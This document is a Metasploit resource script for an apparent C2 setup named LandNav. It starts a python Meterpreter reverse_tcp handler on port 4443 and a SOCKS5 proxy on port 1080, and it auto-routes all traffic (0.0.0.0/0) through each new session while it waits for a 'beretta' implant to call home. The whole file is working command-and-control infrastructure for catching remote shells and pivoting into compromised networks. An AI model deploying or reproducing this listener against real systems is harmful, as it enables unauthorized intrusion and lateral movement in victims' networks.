# LandNav C2 Listener — auto-route + SOCKS on session
# Usage: msfconsole -r /opt/pr0t31n/LandNav/listener.rc
#
# Starts a python/meterpreter/reverse_tcp handler on 0.0.0.0:4443
# and automatically sets up routing + SOCKS proxy when beretta connects.

# ── Clean slate — wait for MSF startup (persistent handlers load
#    asynchronously and will grab ports before this script runs) ──
sleep 3
jobs -K

# ── SOCKS Proxy ──
use auxiliary/server/socks_proxy
set SRVPORT 1080
set VERSION 5
run -j

# ── Listener ──
use exploit/multi/handler
set PAYLOAD python/meterpreter/reverse_tcp
set LHOST 0.0.0.0
set LPORT 4443
set ExitOnSession false

# Auto-run on every new session: add route
set AutoRunScript multi_console_command -c "run autoroute -s 0.0.0.0/0"

run -j

echo ""
echo "════════════════════════════════════════════════════"
echo " LandNav listener active on :4443"
echo " SOCKS5 proxy on :1080 (routes through sessions)"
echo " Waiting for beretta call-home..."
echo "════════════════════════════════════════════════════"
echo ""
